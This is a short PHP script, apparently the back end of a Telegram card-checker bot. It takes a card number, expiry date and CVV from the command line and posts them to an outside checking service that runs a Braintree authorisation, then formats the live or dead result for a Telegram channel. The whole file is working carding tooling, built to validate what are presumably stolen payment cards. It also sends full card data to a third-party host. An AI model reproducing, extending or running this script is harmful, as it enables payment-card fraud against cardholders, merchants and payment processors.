<?php

require   "../Capsolver/vendor/autoload.php";
require   "../CurlX.php";


function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}


$curl = new Curlx;

$cc = trim($argv[1]);
$mes = trim($argv[2]);
$ano = trim($argv[3]);
$cvv = trim($argv[4]);

$headers = array();
$headers[] = 'GFR-Bearer: 28CB120F-0f5D-9Bbc-3dcE-74ae59c1AB41';
// Make the POST request and get the JSON response
$json = $curl::Post('https://gfr.4p15f0rchk.work/PremiumService/', 
                    $data = 'type=Check&Card=' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '&Route=BraintreeCCNAuth_0_9', 
                    $headers)->body;

// Decode the JSON response into an associative array
$data = json_decode($json, true);


// Extract the relevant fields
$response = $data["result"]["response"];
$status = $data["result"]["status"];

// Format the result for display
$resultados = "<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> \n" .
              "[<a href='https://t.me/ritabotchk/35'>✯</a>] Status:<code>$status</code>\n" .
              "Result:<code>$response</code>\n" .
              "━━━━━━━━━━━━━━━━\n\n</b>";

// Output the result
echo $resultados;